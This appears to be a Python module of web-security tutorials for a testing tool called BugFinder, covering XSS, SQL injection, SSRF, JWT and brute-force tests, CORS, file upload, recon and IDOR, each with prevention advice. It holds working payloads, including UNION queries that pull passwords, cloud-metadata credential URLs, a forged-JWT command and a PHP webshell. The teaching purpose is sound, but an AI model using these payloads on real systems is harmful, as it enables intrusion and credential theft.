from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any


@dataclass
class TutorialStep:
    title: str
    content: str
    code: str = ""
    language: str = ""
    expected: str = ""


@dataclass
class Tutorial:
    id: str
    title: str
    description: str
    difficulty: str  # beginner, intermediate, advanced
    category: str
    duration_minutes: int
    steps: list[TutorialStep] = field(default_factory=list)
    references: list[str] = field(default_factory=list)


TUTORIALS: list[Tutorial] = []


def _tutorial(t: Tutorial) -> Tutorial:
    TUTORIALS.append(t)
    return t


XSS_TUTORIAL = _tutorial(
    Tutorial(
        id="xss",
        title="Cross-Site Scripting (XSS)",
        description="Learn how XSS attacks work, how to detect them, and how to prevent them.",
        difficulty="beginner",
        category="web",
        duration_minutes=15,
        steps=[
            TutorialStep(
                title="What is XSS?",
                content="""Cross-Site Scripting (XSS) is a security vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. It occurs when an application includes user-supplied data in web pages without proper validation or escaping.

There are three main types:
- **Reflected XSS**: The malicious script is part of the request (e.g., URL parameter)
- **Stored XSS**: The script is stored on the server (e.g., in a database)
- **DOM-based XSS**: The vulnerability exists in client-side JavaScript rather than server-side""",
            ),
            TutorialStep(
                title="Basic XSS Detection",
                content="The simplest test is to inject a harmless script tag into an input field or URL parameter.",
                code="<!-- Test this in a search box or URL parameter -->\n<script>alert(1)</script>\n\n<!-- Other common payloads -->\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n<body onload=alert(1)>",
                language="html",
                expected="If you see a popup/alert, the parameter is vulnerable to XSS",
            ),
            TutorialStep(
                title="Testing with Burp/Proxy",
                content="Use your intercepting proxy to modify requests and test for XSS. Replace parameter values with XSS payloads.",
                code="""# Example: Testing a search endpoint
GET /search?q=<script>alert(1)</script> HTTP/1.1
Host: example.com

# Look for the payload reflected in the response
# If <script>alert(1)</script> appears unescaped → XSS!""",
                language="http",
            ),
            TutorialStep(
                title="Crafting a PoC with curl",
                content="You can test for reflected XSS directly from the command line using curl.",
                code='curl -s "http://example.com/search?q=<script>alert(1)</script>" | grep -i "script"',
                language="bash",
                expected="If grep finds <script> in the response, the parameter is vulnerable",
            ),
            TutorialStep(
                title="Prevention",
                content="""The primary defense against XSS is **output encoding**:
- HTML entity encode `< > \" ' &` when inserting into HTML context
- Use JavaScript's `textContent` instead of `innerHTML`
- Implement a Content Security Policy (CSP)
- Use templating engines with auto-escaping (Flask/Jinja2, Django, React)

**Key OWASP rule**: Any time you insert user data into HTML, JavaScript, CSS, or URLs — escape it.""",
                code="""# Python (Flask) - safe by default
from markupsafe import escape
safe = escape(user_input)

# JavaScript - use textContent, never innerHTML
document.getElementById('output').textContent = userInput

# CSP Header
Content-Security-Policy: default-src 'self'; script-src 'self'""",
                language="python",
            ),
            TutorialStep(
                title="Practice Exercise",
                content="Try finding XSS on a test target. Use the BugFinder proxy to capture and modify requests.",
                code="""# Step 1: Start BugFinder proxy
bugfinder proxy

# Step 2: Configure your browser to use proxy at 127.0.0.1:8081

# Step 3: Visit your test target and interact with forms/inputs

# Step 4: Check the Proxy page in BugFinder Web UI
#    Look for parameters reflected in the response

# Step 5: Ask the AI Co-pilot for help
#    \"Generate an XSS payload for reflected parameters\"""",
                language="bash",
            ),
        ],
        references=[
            "https://owasp.org/www-community/attacks/xss/",
            "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
            "https://cwe.mitre.org/data/definitions/79.html",
        ],
    )
)


SQLI_TUTORIAL = _tutorial(
    Tutorial(
        id="sqli",
        title="SQL Injection",
        description="Understand SQL injection attacks, how to find them, and how parameterized queries prevent them.",
        difficulty="beginner",
        category="web",
        duration_minutes=20,
        steps=[
            TutorialStep(
                title="What is SQL Injection?",
                content="""SQL Injection (SQLi) is a code injection technique where an attacker inserts malicious SQL statements into application queries. This can allow attackers to:
- Read sensitive data from the database
- Modify or delete data
- Execute administrative operations
- In some cases, gain shell access to the server

SQLi occurs when user input is concatenated directly into SQL queries without proper sanitization or parameterization.""",
            ),
            TutorialStep(
                title="Detection - The Single Quote Test",
                content="The simplest test is to insert a single quote `'` into a parameter and look for database error messages.",
                code="""# Test URL:
http://example.com/products?id=1'

# Expected results:
# VULNERABLE: Error message like "MySQL error near '' at line 1"
# NOT VULNERABLE: Normal page, custom error, or empty results

# Also try:
http://example.com/products?id=1'--
http://example.com/products?id=1' AND '1'='1
http://example.com/products?id=1' AND '1'='2""",
                language="text",
                expected="Database error messages indicate potential SQL injection",
            ),
            TutorialStep(
                title="Boolean-Based Blind SQLi",
                content="When errors are hidden, use boolean conditions to infer the database behavior.",
                code="""# Both should return the same (normal) page:
http://example.com/products?id=1 AND 1=1
http://example.com/products?id=1 AND 1=2

# If the first returns results and the second doesn't → SQLi!
# The condition 1=1 is always true, 1=2 is always false

# Extract data character by character:
http://example.com/products?id=1 AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'
# If returns normally → first char of password starts with 'a'""",
                language="text",
            ),
            TutorialStep(
                title="Extracting Data with UNION",
                content="Use UNION SELECT to combine results with data from other tables.",
                code="""# First, determine the number of columns:
http://example.com/products?id=1 UNION SELECT 1
http://example.com/products?id=1 UNION SELECT 1,2
http://example.com/products?id=1 UNION SELECT 1,2,3
# ... until the page returns normally (no error)

# Then extract database info:
http://example.com/products?id=1 UNION SELECT 1,2,database()
http://example.com/products?id=1 UNION SELECT 1,2,@@version

# Extract table names:
http://example.com/products?id=1 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()

# Extract passwords:
http://example.com/products?id=1 UNION SELECT 1,2,group_concat(password) FROM users""",
                language="text",
            ),
            TutorialStep(
                title="Prevention with Parameterized Queries",
                content="The only reliable defense is **parameterized queries** (prepared statements). Never concatenate user input into SQL.",
                code="""# UNSAFE - string concatenation:
cursor.execute(f"SELECT * FROM users WHERE id = {user_input}")

# SAFE - parameterized query:
cursor.execute("SELECT * FROM users WHERE id = ?", (user_input,))

# SQLAlchemy (Python):
from sqlalchemy import text
result = session.execute(text("SELECT * FROM users WHERE id = :id"), {"id": user_input})

# Additional defenses:
# - Use an ORM (SQLAlchemy, Django ORM)
# - Least privilege database accounts
# - Input validation (type checking, allowlists)""",
                language="python",
            ),
        ],
        references=[
            "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
            "https://portswigger.net/web-security/sql-injection",
            "https://cwe.mitre.org/data/definitions/89.html",
        ],
    )
)


SSRF_TUTORIAL = _tutorial(
    Tutorial(
        id="ssrf",
        title="Server-Side Request Forgery (SSRF)",
        description="Learn how SSRF attacks bypass firewalls to access internal systems and cloud metadata.",
        difficulty="intermediate",
        category="web",
        duration_minutes=15,
        steps=[
            TutorialStep(
                title="What is SSRF?",
                content="""Server-Side Request Forgery (SSRF) occurs when an attacker can make a server-side application make HTTP requests to arbitrary destinations. This allows attackers to:
- Scan internal networks behind firewalls
- Access cloud metadata endpoints (AWS, GCP, Azure)
- Interact with internal services (databases, Redis, etc.)
- Read local files using file:// protocol

Common vulnerable features: URL fetchers, webhooks, file uploads from URLs, proxy functionality.""",
            ),
            TutorialStep(
                title="Detection",
                content="Look for parameters that accept URLs and make requests on the server side.",
                code="""# Test parameters:
?url=
?target=
?destination=
?redirect=
?file=
?load=
?page=

# Basic tests:
http://example.com/fetch?url=http://127.0.0.1:8080
http://example.com/fetch?url=http://localhost:22
http://example.com/fetch?url=http://[::1]:80

# If the server responds with internal service data → SSRF!""",
                language="text",
            ),
            TutorialStep(
                title="Cloud Metadata Exploitation",
                content="Cloud providers expose metadata on well-known internal IPs.",
                code="""# AWS Metadata (most common):
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP Metadata:
http://metadata.google.internal/computeMetadata/v1/
# Header required: Metadata-Flavor: Google

# Azure Metadata:
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Header required: Metadata: true""",
                language="text",
                expected="If you can read cloud metadata, the SSRF is critical (direct access to cloud credentials)",
            ),
            TutorialStep(
                title="Bypassing Allowlists",
                content="Common techniques to bypass URL validation filters.",
                code="""# DNS rebinding:
http://1.2.3.4.xip.io/  → resolves to 1.2.3.4
# Use DNS names that resolve to internal IPs

# URL parsing tricks:
http://evil.com@127.0.0.1/
http://127.0.0.1:80@evil.com/
http://evil.com#@127.0.0.1/
http://127.0.0.1%.evil.com/

# IPv6 variants:
http://[::1]:80/
http://[0:0:0:0:0:ffff:127.0.0.1]/

# Shortened URLs:
http://0/              # → 0.0.0.0
http://2130706433/     # → 127.0.0.1 (decimal)
http://0x7f000001/     # → 127.0.0.1 (hex)""",
                language="text",
            ),
            TutorialStep(
                title="Prevention",
                content="Defense against SSRF requires multiple layers of protection.",
                code="""def safe_fetch(user_url: str) -> str:
    # 1. Scheme allowlist
    if not user_url.startswith(("http://", "https://")):
        raise ValueError("Only HTTP(S) allowed")

    # 2. DNS resolution check
    import socket
    from urllib.parse import urlparse

    parsed = urlparse(user_url)
    ip = socket.gethostbyname(parsed.hostname)

    # 3. Block internal IPs
    private_ranges = ["10.", "172.16.", "192.168.", "127.", "0.", "169.254."]
    if any(ip.startswith(p) for p in private_ranges):
        raise ValueError("Internal IP blocked")

    # 4. Disable redirects
    import httpx
    with httpx.Client(follow_redirects=False) as client:
        return client.get(user_url).text""",
                language="python",
            ),
        ],
        references=[
            "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery/",
            "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html",
            "https://cwe.mitre.org/data/definitions/918.html",
        ],
    )
)


AUTH_TUTORIAL = _tutorial(
    Tutorial(
        id="authentication-bypass",
        title="Authentication & Session Attacks",
        description="Learn about common authentication vulnerabilities: JWT attacks, session fixation, weak passwords, and MFA bypass.",
        difficulty="intermediate",
        category="web",
        duration_minutes=20,
        steps=[
            TutorialStep(
                title="Common Auth Flaws",
                content="""Authentication is the most targeted attack surface. Common vulnerabilities include:
- Weak password policies
- JWT with 'none' algorithm or weak secret
- Session fixation
- Missing brute-force protection
- Insecure password reset flows
- MFA bypass techniques""",
            ),
            TutorialStep(
                title="JWT Attacks",
                content="JWTs are commonly misconfigured. Test the 'none' algorithm, weak secrets, and missing signature verification.",
                code="""# Install PyJWT for testing:
pip install pyjwt

# Test 'none' algorithm attack:
python3 -c "import jwt; print(jwt.encode({'sub':'admin'}, '', algorithm='none'))"

# Test weak secret (common: 'secret', 'password', app name):
python3 -c "import jwt; print(jwt.encode({'sub':'admin'}, 'secret', algorithm='HS256'))"

# Send the forged token:
curl -H "Authorization: Bearer <forged_token>" http://example.com/admin

# If you get 200 → JWT vulnerability!""",
                language="bash",
            ),
            TutorialStep(
                title="Rate Limit Testing",
                content="Test for missing brute-force protection by sending rapid login attempts.",
                code="""# Quick brute-force test with curl:
for pass in password 123456 admin welcome qwerty; do
    curl -s -X POST http://example.com/login \\
        -d "username=admin&password=$pass" \\
        -w "%{http_code}\\n" -o /dev/null
done

# If all requests return 200 → no rate limiting
# Expected: temporary lockout or CAPTCHA after 3-5 attempts""",
                language="bash",
            ),
            TutorialStep(
                title="MFA Bypass Techniques",
                content="Common MFA implementation flaws to test.",
                code="""# 1. Direct endpoint access - can you access /dashboard without MFA?
curl -s -b "session=valid_token" http://example.com/dashboard

# 2. MFA code reuse - can you use an old MFA code?
# 3. MFA code brute-force - is the code short (4 digits)?
# 4. MFA not enforced on API endpoints
# 5. OAuth token reuse""",
                language="bash",
            ),
        ],
        references=[
            "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html",
            "https://cwe.mitre.org/data/definitions/287.html",
        ],
    )
)


API_TUTORIAL = _tutorial(
    Tutorial(
        id="api-testing",
        title="API Security Testing",
        description="Learn how to test REST and GraphQL APIs for common vulnerabilities.",
        difficulty="intermediate",
        category="api",
        duration_minutes=15,
        steps=[
            TutorialStep(
                title="API Reconnaissance",
                content="Start by discovering endpoints, parameters, and authentication mechanisms.",
                code="""# 1. Crawl the API documentation
# Look for /docs, /swagger, /openapi.json, /graphql, /api

# 2. Enumerate endpoints
curl -s http://example.com/api/v1/users
curl -s http://example.com/api/v1/admin
curl -s http://example.com/api/v1/internal

# 3. Test HTTP methods
curl -X PUT http://example.com/api/users/1
curl -X DELETE http://example.com/api/users/1
curl -X PATCH http://example.com/api/users/1

# 4. Check for IDOR (Insecure Direct Object Reference)
curl -s http://example.com/api/users/2  # Try changing the ID""",
                language="bash",
            ),
            TutorialStep(
                title="GraphQL Introspection",
                content="Many GraphQL endpoints leave introspection enabled, revealing the entire schema.",
                code="""# Test for GraphQL:
curl -s -X POST http://example.com/graphql \\
    -H "Content-Type: application/json" \\
    -d '{"query":"{__schema{types{name}}}"}'

# If you get a schema back → introspection is enabled!
# Use this to dump all queries, mutations, and types.

# Test for batching attacks (can request many records at once):
curl -s -X POST http://example.com/graphql \\
    -H "Content-Type: application/json" \\
    -d '{"query":"{user(id:1){id,email,password}}"}'

# Test for deep recursion (DoS):
curl -s -X POST http://example.com/graphql \\
    -H "Content-Type: application/json" \\
    -d '{"query":"{user{posts{author{posts{author{posts{...}}}}}}"}'
# If server doesn't crash → depth limiting is in place""",
                language="bash",
            ),
            TutorialStep(
                title="Rate Limiting & Abuse",
                content="Test API rate limits and business logic abuse.",
                code="""# Test rate limiting - rapid requests:
for i in $(seq 1 100); do
    curl -s -w "%{http_code}\\n" -o /dev/null http://example.com/api/login
done

# Test for mass assignment:
curl -s -X POST http://example.com/api/users \\
    -H "Content-Type: application/json" \\
    -d '{"username":"test","role":"admin","is_admin":true}'

# Test pagination abuse:
curl -s "http://example.com/api/users?limit=999999"
curl -s "http://example.com/api/users?offset=-1"
curl -s "http://example.com/api/users?offset=9999999" """,
                language="bash",
            ),
        ],
        references=[
            "https://owasp.org/www-project-api-security/",
            "https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html",
        ],
    )
)


CORS_TUTORIAL = _tutorial(
    Tutorial(
        id="cors-misconfig",
        title="CORS Misconfiguration",
        description="Learn how CORS misconfigurations allow cross-origin data theft and how to test for them.",
        difficulty="beginner",
        category="web",
        duration_minutes=10,
        steps=[
            TutorialStep(
                title="What is CORS?",
                content="""CORS (Cross-Origin Resource Sharing) is a browser security mechanism that controls which origins can access resources. A misconfigured CORS policy can allow attackers to steal data from authenticated users.

**Dangerous configurations:**
- `Access-Control-Allow-Origin: *` with credentials
- Reflecting the `Origin` header without validation
- Allowing all origins with `Access-Control-Allow-Origin: null`""",
            ),
            TutorialStep(
                title="Testing with curl",
                content="Test CORS by sending an Origin header and checking the response.",
                code="""# Test with a random origin:
curl -s -H "Origin: https://evil.com" \\
    -H "Host: example.com" \\
    http://example.com/api/sensitive \\
    | grep -i "access-control"

# If you see any Access-Control header → test further:
# Look for:
# Access-Control-Allow-Origin: https://evil.com
# Access-Control-Allow-Credentials: true
# Access-Control-Allow-Origin: *

# Check if the origin is reflected:
curl -s -H "Origin: https://attacker.com" \\
    http://example.com/api/data \\
    | grep -i "access-control-allow-origin"

# Check for null origin:
curl -s -H "Origin: null" \\
    http://example.com/api/data \\
    | grep -i "access-control" """,
                language="bash",
            ),
            TutorialStep(
                title="Prevention",
                content="Never use wildcard origins with credentials. Always validate the Origin header against an allowlist.",
                code="""# Python/FastAPI - specific origins only:
app.add_middleware(
    CORSMiddleware,
    allow_origins=["https://example.com", "https://app.example.com"],
    allow_credentials=True,
    allow_methods=["GET", "POST"],
)

# Nginx - validate origin:
set $cors_origin "";
if ($http_origin ~* (https://example\\.com|https://app\\.example\\.com)) {
    set $cors_origin $http_origin;
}
add_header Access-Control-Allow-Origin $cors_origin always;
add_header Access-Control-Allow-Credentials "true" always;""",
                language="python",
            ),
        ],
        references=[
            "https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny/",
            "https://cwe.mitre.org/data/definitions/942.html",
        ],
    )
)


FILE_UPLOAD_TUTORIAL = _tutorial(
    Tutorial(
        id="file-upload",
        title="File Upload Vulnerabilities",
        description="Learn about file upload attacks: webshells, path traversal, MIME type bypass, and double extensions.",
        difficulty="intermediate",
        category="web",
        duration_minutes=15,
        steps=[
            TutorialStep(
                title="File Upload Risks",
                content=""""Unrestricted file upload can lead to:
- Remote code execution (webshell)
- XSS (uploading HTML/SVG files)
- Path traversal in filename
- Malware distribution
- Server-side includes""",
            ),
            TutorialStep(
                title="Testing Techniques",
                content="Test file upload functionality with various payloads and filename manipulations.",
                code="""# 1. Test file type restrictions
# Upload a .php file:
curl -X POST http://example.com/upload \\
    -F "file=@shell.php;type=image/jpeg"

# 2. Double extension bypass:
# shell.php.jpg
# shell.php;.jpg
# shell.php%00.jpg

# 3. Content-Type manipulation:
curl -X POST http://example.com/upload \\
    -F "file=@shell.php;type=image/jpeg;filename=image.jpg"

# 4. Path traversal in filename:
curl -X POST http://example.com/upload \\
    -F "file=@evil.php;filename=../../../var/www/html/evil.php"

# 5. Upload HTML/SVG for XSS:
# <svg onload=alert(document.cookie)>""",
                language="bash",
            ),
            TutorialStep(
                title="Webshell Example",
                content="A simple PHP webshell for testing upload vulnerabilities (use only on authorized targets).",
                code="""<?php
// Simple webshell - for authorized testing only!
$cmd = $_GET['cmd'] ?? '';
if ($cmd) {
    echo '<pre>' . shell_exec($cmd) . '</pre>';
}
?>

<!-- Save as shell.php and try to upload it -->
<!-- Access: http://example.com/uploads/shell.php?cmd=id -->
<!-- Expected: 'uid=www-data...' if successful -->""",
                language="php",
            ),
        ],
        references=[
            "https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload",
            "https://cwe.mitre.org/data/definitions/434.html",
        ],
    )
)


COMMON_TUTORIALS = [
    Tutorial(
        id="recon",
        title="Reconnaissance & OSINT",
        description="Learn passive and active recon techniques: subdomain enumeration, technology fingerprinting, and information gathering.",
        difficulty="beginner",
        category="recon",
        duration_minutes=15,
        steps=[
            TutorialStep(
                title="Passive Reconnaissance",
                content="""Gather information without touching the target:
- **WHOIS**: Domain registration details
- **DNS records**: A, AAAA, MX, NS, TXT
- **Certificate Transparency**: subdomains from SSL certs
- **Wayback Machine**: historical URLs and endpoints
- **Google Dorks**: search for exposed information""",
            ),
            TutorialStep(
                title="DNS Enumeration",
                content="Enumerate DNS records to discover subdomains and infrastructure.",
                code="""# Basic DNS lookups:
dig example.com ANY
nslookup example.com
host -a example.com

# Find mail servers:
dig example.com MX

# Zone transfer (rarely works but always try):
dig axfr @ns1.example.com example.com

# Subdomain brute-force with common wordlist:
for sub in $(cat subdomains.txt); do
    host $sub.example.com | grep "has address"
done""",
                language="bash",
            ),
            TutorialStep(
                title="Certificate Transparency Logs",
                content="Use crt.sh to find subdomains from SSL certificate logs.",
                code="""# Query crt.sh for all certificates:
curl -s "https://crt.sh/?q=%.example.com&output=json" | \\
    jq -r '.[].name_value' | sort -u

# Or use the built-in BugFinder agent:
bugfinder scan -q example.com
# The recon.dns agent will enumerate subdomains automatically""",
                language="bash",
            ),
            TutorialStep(
                title="Technology Fingerprinting",
                content="Identify technologies used by the target (server, framework, libraries).",
                code="""# Check HTTP headers for technology clues:
curl -sI https://example.com | grep -iE "^server:|^x-powered-by:|^x-generator:"

# Use WhatWeb (if installed):
whatweb example.com

# Use the built-in BugFinder agent:
# The recon.tech agent identifies technologies automatically""",
                language="bash",
            ),
        ],
        references=[
            "https://owasp.org/www-project-web-security-testing-guide/",
            "https://crt.sh/",
        ],
    ),
    Tutorial(
        id="idor",
        title="Insecure Direct Object References (IDOR)",
        description="Learn how to find and exploit IDOR vulnerabilities where users can access unauthorized resources.",
        difficulty="beginner",
        category="web",
        duration_minutes=10,
        steps=[
            TutorialStep(
                title="What is IDOR?",
                content="""IDOR (Insecure Direct Object Reference) occurs when an application exposes direct references to internal objects (like database IDs) without proper access control checks.

**Common examples:**
- `/api/users/1` — you access user 2 by changing the ID
- `/invoice/INV-001` — you access another user's invoice
- `/documents/download?file=report.pdf` — you download someone else's file

IDOR is one of the most common and critical bugs in web applications.""",
            ),
            TutorialStep(
                title="Testing for IDOR",
                content="Look for endpoints with sequential IDs, UUIDs, or predictable patterns.",
                code="""# 1. Create two accounts, capture the IDs
# Account A: /api/profile/100
# Account B: Try /api/profile/100 while logged in as B

# 2. Test for horizontal IDOR (same role, different user):
curl -s -b "session=ACCOUNT_B_SESSION" \\
    http://example.com/api/users/ACCOUNT_A_ID

# 3. Test for vertical IDOR (lower privilege, higher):
curl -s -b "session=USER_SESSION" \\
    http://example.com/api/admin/users

# 4. Try UUID enumeration:
# /api/orders/00000000-0000-0000-0000-000000000001
# /api/orders/00000000-0000-0000-0000-000000000002""",
                language="bash",
            ),
        ],
        references=[
            "https://owasp.org/www-community/vulnerabilities/Insecure_Direct_Object_Reference",
            "https://cwe.mitre.org/data/definitions/639.html",
        ],
    ),
]


def get_tutorial(tutorial_id: str) -> Tutorial | None:
    all_tutorials = TUTORIALS + COMMON_TUTORIALS
    for t in all_tutorials:
        if t.id == tutorial_id:
            return t
    return None


def list_tutorials() -> list[dict[str, Any]]:
    all_tutorials = TUTORIALS + COMMON_TUTORIALS
    return [
        {
            "id": t.id,
            "title": t.title,
            "description": t.description,
            "difficulty": t.difficulty,
            "category": t.category,
            "duration_minutes": t.duration_minutes,
            "steps_count": len(t.steps),
        }
        for t in all_tutorials
    ]
